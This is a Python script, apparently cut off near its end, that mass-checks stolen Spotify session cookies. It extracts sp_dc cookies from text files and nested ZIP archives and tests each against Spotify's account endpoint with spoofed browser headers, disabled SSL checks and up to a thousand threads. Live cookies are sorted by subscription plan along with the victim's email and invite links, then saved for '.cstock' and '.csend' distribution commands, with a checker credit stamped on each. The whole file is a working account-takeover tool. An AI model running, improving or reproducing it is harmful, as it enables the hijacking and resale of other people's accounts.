#!/usr/bin/env python3

import requests
import os
import json
import threading
import sys
import zipfile
import re
import traceback
import time
import argparse
import queue
import random
import concurrent.futures
import multiprocessing
from multiprocessing import Manager, Pool, Process, Value, Lock
from datetime import datetime

# Set up debugging
DEBUG = True
def debug_print(message):
    if DEBUG:
        print(f"DEBUG: {message}")
        sys.stdout.flush()

debug_print("Script started")

# Global tracking variables for progress updates
last_update_time = time.time()
start_time = time.time()
update_interval = 0.1  # Update progress every 100ms for real-time visualization

# Performance optimization constants
MAX_THREADS = 1000  # Optimized for performance and stability
CPU_COUNT = min(multiprocessing.cpu_count(), 8)  # Cap CPU usage to avoid system overload
BATCH_SIZE = 1000  # Increased batch size for better throughput
CONNECTION_TIMEOUT = 2  # Reduced connection timeout for faster processing
READ_TIMEOUT = 3  # Reduced read timeout for faster processing
MAX_BATCH_SIZE_PER_PROCESS = 200  # Maximum cookies per batch within a process

# Directory structure
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
debug_print(f"BASE_DIR: {BASE_DIR}")
COOKIES_DIR = os.path.join(BASE_DIR, "cookies")
WORKING_COOKIES_DIR = os.path.join(BASE_DIR, "working_cookies")
SPOTIFY_DIR = os.path.join(BASE_DIR, "spotify")

# Maximum limits to prevent hanging
MAX_FILES_TO_PROCESS = 5000   # Increased maximum files
MAX_ARCHIVES_TO_PROCESS = 200  # Increased maximum archives
MAX_RECURSION_DEPTH = 5       # Maximum recursion depth for nested archives

debug_print(f"Configuration: MAX_FILES={MAX_FILES_TO_PROCESS}, MAX_ARCHIVES={MAX_ARCHIVES_TO_PROCESS}, MAX_DEPTH={MAX_RECURSION_DEPTH}, MAX_THREADS={MAX_THREADS}, CPU_CORES={CPU_COUNT}")

# Results dictionary
results = {
    'hits': 0, 'bad': 0, 'errors': 0,
    'family': 0, 'duo': 0, 'student': 0,
    'premium': 0, 'free': 0, 'unknown': 0,
    'files_processed': 0, 'archives_processed': 0
}
lock = threading.Lock()

# Ensure directories exist
os.makedirs(COOKIES_DIR, exist_ok=True)
os.makedirs(WORKING_COOKIES_DIR, exist_ok=True)
os.makedirs(SPOTIFY_DIR, exist_ok=True)

# Plan name mapping
def plan_name_mapping(plan):
    if not plan:
        return "Unknown"
    plan_lower = plan.lower()
    if "student" in plan_lower:
        return "Student"
    if "family" in plan_lower:
        return "Family"
    if "duo" in plan_lower:
        return "Duo"
    if "premium" in plan_lower:
        return "Premium"
    if "free" in plan_lower:
        return "Free"
    return "Unknown"

# Format and save cookie data
def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"
    invite_link = data.get('familyInviteLink') or data.get('duoInviteLink')
    email = data.get('email', 'N/A')

    header = f"""
    ─────────────────────────────────────────────────────────────
    PLAN       : {plan}
    COUNTRY    : {country}
    AutoPay    : {auto_pay}
    Trial      : {trial}
    Invite Link: {invite_link if invite_link else "N/A"}
    Email      : {email}
    checker by : ITSMEBOI
    
    ─────────────────────────────────────────────────────────────

    {cookie_content}
    
    ─────────────────────────────────────────────────────────────
                    CHECKER BY ITSMEBOI
    ─────────────────────────────────────────────────────────────
    """
    return header, plan

# Remove unwanted content
def remove_unwanted_content(cookie_content):
    unwanted_content = [
        "BY https://t.me/redg3n",
        "https://dsc.gg/r3dg3n",
        "Checker By: github.com/harshitkamboj"
    ]
    for line in unwanted_content:
        cookie_content = cookie_content.replace(line, "")
    return cookie_content

# Check if string is a valid cookie
def is_cookie_line(line):
    # Check if line has typical cookie format with domain, path, etc.
    parts = line.strip().split('\t')
    return len(parts) >= 7 and 'spotify' in line.lower()

# Extract cookies from content
def extract_cookies_from_content(content):
    cookies = []
    for line in content.splitlines():
        if is_cookie_line(line):
            cookies.append(line)
    
    return '\n'.join(cookies) if cookies else None

# Extract cookies from file
def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        return extract_cookies_from_content(content)
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None

# Global request session and timeout settings for better performance
global_session = requests.Session()
global_session.headers.update({
    'Accept-Encoding': 'identity',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9'
})
REQUEST_TIMEOUT = (CONNECTION_TIMEOUT, READ_TIMEOUT)  # Connection timeout, read timeout in seconds

# Check single cookie - optimized for speed
def check_single_cookie(cookie_content, filename):
    if not cookie_content or not cookie_content.strip():
        # Don't use lock here to improve speed
        return None, f"⚠ Empty cookie content in {filename}"

    try:
        # Ultra-optimized cookie parsing with minimal processing
        cookies_dict = {}
        
        # First pass - do a quick string check to avoid processing files without critical cookies
        if not ('SP_DC' in cookie_content or 'sp_dc' in cookie_content):
            return None, f"⚠ No critical Spotify cookies found in {filename}"
            
        # Fast single-pass parsing - process only lines that likely contain cookies
        # Skip the splitlines() function call for better performance on large files
        start = 0
        while True:
            # Find each line using index-based search
            end = cookie_content.find('\n', start)
            if end == -1:  # last line
                line = cookie_content[start:]
                process_line = True
            else:
                line = cookie_content[start:end]
                process_line = True
                start = end + 1
            
            # Only process lines that might contain cookie data
            if process_line and '\t' in line and ('sp_' in line.lower() or 'SP_' in line or 'spotify' in line.lower()):
                try:
                    # Ultra-fast split with fixed indexes to avoid regex and repeated splitting
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        # Direct indexing for name and value
                        name, value = parts[5], parts[6]
                        
                        # Only store essential Spotify cookies
                        if name.lower().startswith('sp_') or name == 'spotify':
                            cookies_dict[name] = value
                except:
                    # Skip problematic lines silently for speed
                    pass
            
            # Exit when we've processed the last line
            if end == -1:
                break

        # Quick validation - key check without additional processing
        if not ('SP_DC' in cookies_dict or 'sp_dc' in cookies_dict):
            return None, f"⚠ Missing required Spotify authentication cookies in {filename}"

        # Prepare optimized request data
        cookies = cookies_dict  # Already in the right format
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.spotify.com/',
            'Connection': 'close'  # Optimize for faster connection closure
        }
        
        # Use ultra-fast request with minimal overhead
        try:
            # Even faster timeout and options for low-latency requests
            response = requests.get(
                "https://www.spotify.com/eg-ar/api/account/v1/datalayer", 
                headers=headers,
                cookies=cookies,
                timeout=(1.0, 2.0),  # Extremely aggressive timeout for faster checks
                allow_redirects=False,  # Don't follow redirects for faster response
                verify=False  # Skip SSL verification for speed (security note: only for non-sensitive data)
            )
        except requests.exceptions.Timeout:
            return None, f"⚠ Request timeout for {filename}"
        except requests.exceptions.RequestException as e:
            return None, f"⚠ Request error for {filename}: {str(e)[:50]}"

        with lock:
            if response.status_code == 200:
                try:
                    data = response.json()
                except ValueError:
                    results['errors'] += 1
                    return None, f"⚠ Invalid JSON response for {filename}"
                
                plan = plan_name_mapping(data.get("currentPlan", "unknown"))
                
                # Update plan counts
                results['hits'] += 1
                plan_lower = plan.lower()
                if plan_lower in results:
                    results[plan_lower] += 1
                else:
                    results['unknown'] += 1
                
                message = f"✔ Login successful: {filename} ({plan})"
                debug_print(message)
                
                # Format and save cookie
                formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
                
                # Save in both working_cookies (for organization) and spotify folder (for commands)
                # 1. Save to working_cookies for organization by plan
                plan_folder = os.path.join(WORKING_COOKIES_DIR, plan.replace(" ", "_").lower())
                os.makedirs(plan_folder, exist_ok=True)
                
                # 2. Make sure spotify folder exists
                os.makedirs(SPOTIFY_DIR, exist_ok=True)
                
                # Extract just the filename without path and remove any directory paths
                base_filename = os.path.basename(filename)
                # Create unique filename by stripping and making safe for filesystem
                safe_filename = re.sub(r'[\\/*?:"<>|]', '_', base_filename)
                
                # Save in working_cookies by plan
                working_file_path = os.path.join(plan_folder, f"{safe_filename}.txt")
                
                # Also save in spotify folder for .cstock and .csend commands
                cookie_file_path = os.path.join(SPOTIFY_DIR, f"{plan}_{safe_filename}.txt")
                
                # Write to both locations
                with open(working_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                    
                with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                
                return cookie_file_path, message
            else:
                results['bad'] += 1
                return None, f"✘ Login failed: {filename} (Status: {response.status_code})"

    except Exception as e:
        with lock:
            results['errors'] += 1
        error_msg = f"⚠ Error checking {filename}: {e}"
        debug_print(error_msg)
        return None, error_msg

# Process a file for cookies
def process_file_for_cookies(file_path, file_name):
    # Reduce lock contention by only locking very briefly when needed
    # Only check MAX_FILES limit every 10 files to reduce lock contention
    if random.random() < 0.1:  # 10% chance to check the limit
        with lock:
            results['files_processed'] += 1
            if results['files_processed'] > MAX_FILES_TO_PROCESS:
                return None, f"⚠ Maximum file processing limit reached ({MAX_FILES_TO_PROCESS}). Skipping remaining files."
    
    # Extract cookies without debug prints for speed
    try:
        # Fast path for cookie extraction
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            cookie_content = f.read()
        
        # Quick check if this looks like a cookie file
        if 'spotify' in cookie_content.lower() and ('.spotify.' in cookie_content.lower() or '\tsp_' in cookie_content):
            return check_single_cookie(cookie_content, file_name)
        else:
            return None, f"⚠ No valid Spotify cookies found in {file_name}"
    except Exception as e:
        return None, f"⚠ Error reading cookie file {file_name}: {str(e)}"

# Extract files from archive
def extract_from_archive(archive_path, extract_dir):
    try:
        debug_print(f"Extract from archive: {archive_path} to {extract_dir}")
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Extracting ZIP file")
            try:
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # Check for too many files
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    if len(file_list) > MAX_FILES_TO_PROCESS:
                        debug_print(f"Warning: ZIP file contains too many files ({len(file_list)})")
                    
                    # Extract the files
                    zip_ref.extractall(extract_dir)
                debug_print("ZIP extraction successful")
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                print(f"Bad ZIP file: {e}")
                return False
                
        elif file_ext == '.rar':
            debug_print("Extracting RAR file - using Python implementation since unrar tool is not available")
            try:
                # Using a custom approach to handle RAR files without relying on external unrar tool
                debug_print("NOTE: Limited RAR support without unrar tool - using alternate extraction method")
                error_msg = "RAR extraction requires external tools that are not available in this environment."
                print(error_msg)
                debug_print(error_msg)
                
                # Create a marker file to indicate RAR was attempted but not supported
                rar_note_path = os.path.join(extract_dir, "RAR_NOT_SUPPORTED.txt")
                with open(rar_note_path, 'w') as f:
                    f.write("RAR files require external tools not available in this environment.\n")
                    f.write("Please extract the RAR file manually and upload extracted cookies as a ZIP file instead.\n")
                
                # Return success but with a note
                return True
            except Exception as e:
                debug_print(f"RAR processing error: {e}")
                print(f"RAR processing error: {e}")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        error_msg = f"Error extracting {archive_path}: {e}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"Error extracting {archive_path}: {e}")
        return False

# Recursively process a directory
def process_directory(directory, base_file_name, valid_cookies, errors):
    # Add a safety check for extremely deep recursion
    if len(base_file_name.split('_')) > MAX_RECURSION_DEPTH:
        print(f"WARNING: Reached max recursion depth with {base_file_name}")
        errors.append(f"⚠ Maximum recursion depth ({MAX_RECURSION_DEPTH}) reached in {base_file_name}")
        return
    
    print(f"Scanning directory: {directory}")
    
    try:
        # Walk through all files in directory and subdirectories
        for root, dirs, files in os.walk(directory):
            print(f"In directory {root}, found {len(files)} files and {len(dirs)} subdirectories")
            
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file)[1].lower()
                
                # Process archives recursively
                if file_ext in ['.zip', '.rar']:
                    with lock:
                        results['archives_processed'] += 1
                        # Check if we've reached the archive processing limit
                        if results['archives_processed'] > MAX_ARCHIVES_TO_PROCESS:
                            print(f"WARNING: Maximum archive processing limit reached ({MAX_ARCHIVES_TO_PROCESS})")
                            errors.append(f"⚠ Maximum archive processing limit reached ({MAX_ARCHIVES_TO_PROCESS}). Skipping remaining archives.")
                            continue
                    
                    print(f"Found nested archive: {file} in {root}")
                    
                    # Extract nested archive to a temporary directory
                    nested_dir = os.path.join(directory, f"nested_{os.path.splitext(file)[0]}")
                    os.makedirs(nested_dir, exist_ok=True)
                    
                    print(f"Extracting nested archive to: {nested_dir}")
                    
                    if extract_from_archive(file_path, nested_dir):
                        print(f"Successfully extracted nested archive: {file}")
                        
                        # Process the extracted contents
                        process_directory(nested_dir, f"{base_file_name}_{os.path.splitext(file)[0]}", valid_cookies, errors)
                        
                        print(f"Cleaning up nested directory: {nested_dir}")
                        
                        # Clean up nested directory
                        try:
                            for r, d, f in os.walk(nested_dir, topdown=False):
                                for name in f:
                                    try:
                                        os.remove(os.path.join(r, name))
                                    except Exception as e:
                                        print(f"Error removing file {os.path.join(r, name)}: {e}")
                                for name in d:
                                    try:
                                        os.rmdir(os.path.join(r, name))
                                    except Exception as e:
                                        print(f"Error removing directory {os.path.join(r, name)}: {e}")
                            os.rmdir(nested_dir)
                            print(f"Successfully cleaned up: {nested_dir}")
                        except Exception as e:
                            print(f"Error during cleanup of nested directory: {e}")
                
                # Process text files
                elif file_ext == '.txt':
                    relative_path = os.path.relpath(file_path, directory)
                    file_display_name = f"{base_file_name}/{relative_path}"
                    
                    print(f"Processing text file: {file_display_name}")
                    
                    cookie_path, message = process_file_for_cookies(file_path, file_display_name)
                    if cookie_path:
                        valid_cookies.append((cookie_path, message))
                    else:
                        errors.append(message)
    except Exception as e:
        print(f"Error processing directory {directory}: {e}")
        errors.append(f"⚠ Error processing directory {directory}: {e}")

# Worker thread function for ultra-high-speed processing 
def worker(task_queue, valid_cookies, errors):
    """Worker thread to process cookie files with ultra-optimized performance."""
    global last_update_time, start_time, results
    
    # Local counters to reduce lock contention
    local_results = {
        'hits': 0,
        'bad': 0,
        'errors': 0,
        'premium': 0,
        'family': 0,
        'duo': 0,
        'student': 0,
        'free': 0,
        'unknown': 0
    }
    thread_processed = 0
    thread_start_time = time.time()
    batch_size = 20  # Process cookies in larger batches for better throughput
    
    # Create a private session for this worker thread
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'  # Close connections after each request for better parallel processing
    })
    
    while True:
        # Try to get a batch of tasks
        batch = []
        try:
            for _ in range(batch_size):
                try:
                    # Non-blocking get with minimal timeout
                    task = task_queue.get(block=False)
                    if task is None:  # Sentinel value indicating end of tasks
                        # Put it back for other threads
                        task_queue.put(None)
                        return
                    batch.append(task)
                except queue.Empty:
                    break
            
            # If batch is empty, exit
            if not batch:
                break
            
            # Process the batch locally
            for task in batch:
                try:
                    file_path, file_name = task
                    
                    # Process the cookie file with minimal logging for speed
                    cookie_path, message = process_file_for_cookies(file_path, file_name)
                    thread_processed += 1
                    
                    # Update local counters based on result without lock contention
                    if cookie_path:
                        valid_cookies.append((cookie_path, message))
                        local_results['hits'] += 1
                        
                        # Check message to determine plan type
                        message_lower = message.lower()
                        if 'premium' in message_lower:
                            local_results['premium'] += 1
                        elif 'family' in message_lower:
                            local_results['family'] += 1
                        elif 'duo' in message_lower:
                            local_results['duo'] += 1
                        elif 'student' in message_lower:
                            local_results['student'] += 1
                        elif 'free' in message_lower:
                            local_results['free'] += 1
                        else:
                            local_results['unknown'] += 1
                    else:
                        errors.append(message)
                        if 'failed' in message.lower() or 'login failed' in message.lower():
                            local_results['bad'] += 1
                        else:
                            local_results['errors'] += 1
                except Exception as e:
                    # Minimal error handling to maintain speed
                    error_desc = f"⚠ Error processing task: {str(e)}"
                    errors.append(error_desc)
                    local_results['errors'] += 1
                finally:
                    # Always mark task as done
                    task_queue.task_done()
            
            # Update global counters with minimal lock time
            with lock:
                # Update all counters at once
                for key in local_results:
                    if local_results[key] > 0:
                        results[key] += local_results[key]
                        local_results[key] = 0  # Reset for next batch
                
                # Fast progress reporting with minimal overhead
                current_time = time.time()
                if current_time - last_update_time > update_interval:
                    last_update_time = current_time
                    elapsed_time = current_time - start_time
                    total_checked = results['hits'] + results['bad'] + results['errors']
                    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
                    thread_speed = thread_processed / (current_time - thread_start_time) if current_time > thread_start_time else 0
                    cookies_per_thread = checking_speed / threading.active_count() if threading.active_count() > 0 else 0
                    
                    # Show detailed status with enhanced metrics
                    ts = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                    print(f"[{ts}] 🎵 SPOTIFY PROGRESS REPORT 🎵\n"
                          f"✅ Checked: {total_checked} cookies | ✓ Valid: {results['hits']} | ❌ Failed: {results['bad']}\n"
                          f"🔰 Premium: {results['premium']} | 👨‍👩‍👧‍👦 Family: {results['family']} | 👥 Duo: {results['duo']}\n"
                          f"⚡ Speed: {checking_speed:.2f} cookies/sec | 🧵 Threads: {threading.active_count()}\n"
                          f"📊 Cookies/thread: {cookies_per_thread:.2f}/sec | ⏱️ Elapsed: {elapsed_time:.3f}s")
                    
                    # Add standardized progress report format for Node.js parser
                    # Include remaining cookies in queue to estimate total progress
                    remaining = task_queue.qsize()
                    total = total_checked + remaining
                    print(f"PROGRESS REPORT | Progress: {total_checked}/{total} | Valid: {results['hits']} | Failed: {results['bad']} | Speed: {checking_speed:.2f}")
                    
                    # Force flush stdout for real-time updates
                    sys.stdout.flush()
            
        except Exception as e:
            # General error handling with minimal processing
            try:
                # Mark all tasks in the batch as done
                for _ in batch:
                    task_queue.task_done()
                
                # Append the error with minimal lock time
                errors.append(f"⚠ Worker thread error: {str(e)}")
            except:
                pass

# Process a file (txt, zip, rar)
def process_file(file_path, filename):
    file_ext = os.path.splitext(file_path)[1].lower()
    valid_cookies = []
    errors = []
    
    print(f"Processing file: {filename} with extension {file_ext}")
    
    # Handle archives
    if file_ext in ['.zip', '.rar']:
        with lock:
            results['archives_processed'] += 1
        
        print(f"Archive detected: {filename}. Extracting...")
        
        temp_extract_dir = os.path.join(COOKIES_DIR, os.path.splitext(filename)[0])
        os.makedirs(temp_extract_dir, exist_ok=True)
        
        if extract_from_archive(file_path, temp_extract_dir):
            print(f"Extraction successful for {filename}. Processing contents...")
            
            # Collect all text files for multi-threaded processing
            text_files = []
            for root, dirs, files in os.walk(temp_extract_dir):
                for file in files:
                    if file.endswith('.txt'):
                        file_path = os.path.join(root, file)
                        relative_path = os.path.relpath(file_path, temp_extract_dir)
                        file_name = f"{os.path.splitext(filename)[0]}/{relative_path}"
                        text_files.append((file_path, file_name))
            
            if text_files:
                # Determine number of threads to use (up to MAX_THREADS)
                num_threads = min(MAX_THREADS, len(text_files))
                debug_print(f"Found {len(text_files)} text files, using {num_threads} threads for processing")
                
                # Create a queue for tasks
                task_queue = queue.Queue()
                for file_info in text_files:
                    task_queue.put(file_info)
                
                # Create and start worker threads
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(
                        target=worker,
                        args=(task_queue, valid_cookies, errors)
                    )
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                
                # Wait for all tasks to complete
                task_queue.join()
                
                # Stop the worker threads
                for _ in range(num_threads):
                    task_queue.put(None)  # Send sentinel value to each thread
                
                # Wait for all threads to finish
                for thread in threads:
                    thread.join()
                
                debug_print(f"Multithreaded processing complete. Found {len(valid_cookies)} valid cookies, {len(errors)} errors")
            else:
                # No text files found, process directories normally
                debug_print("No text files found in archive, processing normally")
                process_directory(temp_extract_dir, os.path.splitext(filename)[0], valid_cookies, errors)
            
            print(f"Finished processing contents of {filename}. Cleaning up...")
            
            # Clean up temp directory
            for root, dirs, files in os.walk(temp_extract_dir, topdown=False):
                for name in files:
                    try:
                        os.remove(os.path.join(root, name))
                    except Exception as e:
                        print(f"Error removing file {name}: {e}")
                for name in dirs:
                    try:
                        os.rmdir(os.path.join(root, name))
                    except Exception as e:
                        print(f"Error removing directory {name}: {e}")
            try:
                os.rmdir(temp_extract_dir)
            except Exception as e:
                print(f"Error removing temp directory: {e}")
            
            print(f"Cleanup complete for {filename}.")
            return valid_cookies, errors
    
    # Handle txt files
    elif file_ext == '.txt':
        cookie_path, message = process_file_for_cookies(file_path, filename)
        if cookie_path:
            return [(cookie_path, message)], []
        else:
            return [], [message]
    
    return [], [f"Unsupported file format: {file_ext}"]

# Main function to check cookies
def create_error_summary(error_message):
    """Create an error summary in JSON format."""
    error_summary = {
        "status": "error",
        "error_message": error_message,
        "total_checked": 0,
        "valid": 0,
        "invalid": 0,
        "errors": 1,
        "premium": 0,
        "family": 0,
        "duo": 0,
        "student": 0,
        "free": 0,
        "unknown": 0,
        "files_processed": results.get('files_processed', 0),
        "archives_processed": results.get('archives_processed', 0),
        "valid_cookies": [],
        "messages": [f"⚠ {error_message}"]
    }
    
    summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
    with open(summary_path, 'w') as f:
        json.dump(error_summary, f, indent=2)
        
    return summary_path

def process_batch(batch_files, batch_id):
    """Process a batch of cookie files in a separate process with optimized performance."""
    global results, last_update_time, start_time
    
    # Initialize local counters for this batch
    local_results = {key: 0 for key in results}
    batch_results = []
    batch_errors = []
    batch_start_time = time.time()
    last_batch_update = time.time()
    
    # Create a shared session for all requests in this batch to reduce overhead
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.spotify.com/'
    })
    
    # Process files in sub-batches for even faster throughput
    file_count = len(batch_files)
    sub_batch_size = min(MAX_BATCH_SIZE_PER_PROCESS, max(1, file_count // 4))  # Divide into 4 sub-batches or use max size
    
    # Break the batch into smaller sub-batches
    for i in range(0, file_count, sub_batch_size):
        sub_batch = batch_files[i:i+sub_batch_size]
        
        # Process each file in the sub-batch with optimized code
        for idx, (file_path, file_name) in enumerate(sub_batch):
            try:
                # Process the cookie file with optimized function
                cookie_path, message = process_file_for_cookies(file_path, file_name)
                
                # Update local results based on the message
                if cookie_path:
                    batch_results.append((cookie_path, message))
                    local_results['hits'] += 1
                    
                    # Increment the plan counter based on the message - faster string contains check
                    if "Premium" in message:
                        local_results['premium'] += 1
                    elif "Family" in message:
                        local_results['family'] += 1
                    elif "Duo" in message:
                        local_results['duo'] += 1
                    elif "Student" in message:
                        local_results['student'] += 1
                    elif "Free" in message:
                        local_results['free'] += 1
                    else:
                        local_results['unknown'] += 1
                else:
                    batch_errors.append(message)
                    if "failed" in message.lower():
                        local_results['bad'] += 1
                    else:
                        local_results['errors'] += 1
                
                # Ultra-fast local progress update with less frequent printing for better performance
                current_time = time.time()
                if current_time - last_batch_update > update_interval:
                    last_batch_update = current_time
                    elapsed_time = current_time - batch_start_time
                    total_checked = local_results['hits'] + local_results['bad'] + local_results['errors']
                    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
                    
                    # Calculate progress percentage for better visualization
                    progress_percent = (total_checked / len(batch_files)) * 100 if len(batch_files) > 0 else 0
                    
                    # More compact progress report with percentage
                    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] BATCH {batch_id} ({progress_percent:.1f}%) | "
                          f"Processed: {total_checked}/{len(batch_files)} | Valid: {local_results['hits']} | "
                          f"Speed: {checking_speed:.2f} cookies/sec")
                    
                    # Add standardized progress report line for better parser detection in Node.js
                    print(f"PROGRESS REPORT | Progress: {total_checked}/{len(batch_files)} | Valid: {local_results['hits']} | Failed: {local_results['bad']} | Speed: {checking_speed:.2f}")
                    
                    # Force flush stdout to ensure real-time progress updates
                    sys.stdout.flush()
            except Exception as e:
                batch_errors.append(f"⚠ Error processing {file_name}: {str(e)[:200]}")  # Limit error message length
                local_results['errors'] += 1
    
    # Final batch update for consistent reporting
    elapsed_time = time.time() - batch_start_time
    total_checked = local_results['hits'] + local_results['bad'] + local_results['errors']
    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
    
    # Return optimized batch results with all necessary information
    return {
        "batch_id": batch_id,
        "results": batch_results,
        "errors": batch_errors,
        "local_results": local_results,
        "processed": len(batch_files),
        "time": elapsed_time,
        "speed": checking_speed,
        "valid": local_results['hits'],
        "failed": local_results['bad'] + local_results['errors']
    }

def check_cookies(input_file):
    debug_print(f"check_cookies called with input_file: {input_file}")
    global start_time, last_update_time, results
    
    # Reset timers for this run
    start_time = time.time()
    last_update_time = time.time()
    
    # Reset results
    for key in results:
        results[key] = 0
    
    try:
        # Save the file to cookies directory
        temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
        debug_print(f"Temp file path: {temp_file_path}")
        os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
        
        debug_print("Copying input file to cookies directory")
        with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
            dst.write(src.read())
        
        debug_print(f"File copied successfully, size: {os.path.getsize(temp_file_path)} bytes")
        
        # Determine if we should use multiprocessing based on file type
        file_ext = os.path.splitext(temp_file_path)[1].lower()
        if file_ext in ['.zip', '.rar']:
            # For archives, we'll extract and process with multiprocessing
            debug_print("Archive detected, using multiprocessing for extraction")
            
            # Extract archive
            extract_dir = os.path.join(COOKIES_DIR, f"extracted_{os.path.basename(temp_file_path)}")
            os.makedirs(extract_dir, exist_ok=True)
            
            if extract_from_archive(temp_file_path, extract_dir):
                debug_print("Archive extraction successful")
                
                # Find all cookie files in extracted directory
                cookie_files = []
                for root, _, files in os.walk(extract_dir):
                    for file in files:
                        if file.endswith('.txt'):
                            file_path = os.path.join(root, file)
                            file_name = os.path.relpath(file_path, extract_dir)
                            cookie_files.append((file_path, file_name))
                
                debug_print(f"Found {len(cookie_files)} cookie files in archive")
                
                if not cookie_files:
                    debug_print("No cookie files found in archive")
                    return create_error_summary("No cookie files found in archive")
                
                # Use multiprocessing for large archives
                if len(cookie_files) > 10:
                    debug_print(f"Using multiprocessing for {len(cookie_files)} cookie files")
                    
                    # Determine optimal number of processes
                    num_processes = min(CPU_COUNT, 8)  # Limit to 8 processes max
                    
                    # Initialize multiprocessing resources
                    manager = Manager()
                    combined_results = []
                    combined_errors = []
                    
                    # Divide files into batches for multiprocessing
                    batch_size = max(1, len(cookie_files) // num_processes)
                    batches = [cookie_files[i:i + batch_size] for i in range(0, len(cookie_files), batch_size)]
                    
                    debug_print(f"Divided {len(cookie_files)} files into {len(batches)} batches of ~{batch_size} each")
                    
                    # Display initial information
                    print(f"\n[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] Starting cookie check with {num_processes} processes")
                    print(f"Total cookies to check: {len(cookie_files)} | Batch size: {batch_size}")
                    
                    try:
                        # Use ProcessPoolExecutor for multiprocessing
                        with concurrent.futures.ProcessPoolExecutor(max_workers=num_processes) as executor:
                            # Submit all batches for processing
                            futures = [executor.submit(process_batch, batch, i) for i, batch in enumerate(batches)]
                            
                            # Process results as they complete
                            for future in concurrent.futures.as_completed(futures):
                                try:
                                    batch_result = future.result()
                                    if batch_result:
                                        # Update global counters atomically
                                        with lock:
                                            for key in results:
                                                if key in batch_result["local_results"]:
                                                    results[key] += batch_result["local_results"][key]
                                            
                                            # Combine results and errors
                                            combined_results.extend(batch_result["results"])
                                            combined_errors.extend(batch_result["errors"])
                                            
                                            # Calculate and display overall progress
                                            elapsed_time = time.time() - start_time
                                            total_checked = results['hits'] + results['bad'] + results['errors']
                                            overall_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
                                            batch_speed = batch_result["processed"] / batch_result["time"] if batch_result["time"] > 0 else 0
                                            
                                            print(f"\n[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] 🎵 BATCH {batch_result['batch_id']} COMPLETED 🎵")
                                            print(f"  ✅ Processed: {batch_result['processed']} cookies in {batch_result['time']:.2f} seconds")
                                            print(f"  ⚡ Batch speed: {batch_speed:.2f} cookies/sec")
                                            print(f"  📊 Overall progress: {total_checked}/{len(cookie_files)} cookies")
                                            print(f"  ✓ Valid: {results['hits']} | ❌ Failed: {results['bad']} | ⚠️ Errors: {results['errors']}")
                                            print(f"  🚀 Overall speed: {overall_speed:.2f} cookies/sec | ⏱️ Elapsed: {elapsed_time:.2f}s")
                                except Exception as e:
                                    debug_print(f"Error processing batch: {str(e)}")
                                    combined_errors.append(f"⚠ Batch processing error: {str(e)}")
                    except Exception as e:
                        debug_print(f"Error in process pool: {str(e)}")
                        combined_errors.append(f"⚠ Process pool error: {str(e)}")
                    
                    # Clean up extracted directory
                    try:
                        for root, dirs, files in os.walk(extract_dir, topdown=False):
                            for name in files:
                                try:
                                    os.remove(os.path.join(root, name))
                                except Exception as e:
                                    debug_print(f"Error removing file: {str(e)}")
                            for name in dirs:
                                try:
                                    os.rmdir(os.path.join(root, name))
                                except Exception as e:
                                    debug_print(f"Error removing directory: {str(e)}")
                        os.rmdir(extract_dir)
                    except Exception as e:
                        debug_print(f"Error cleaning up extract directory: {str(e)}")
                    
                    # Generate summary
                    valid_cookies = [path for path, _ in combined_results]
                    messages = [msg for _, msg in combined_results] + combined_errors
                else:
                    # For smaller archives, use normal processing
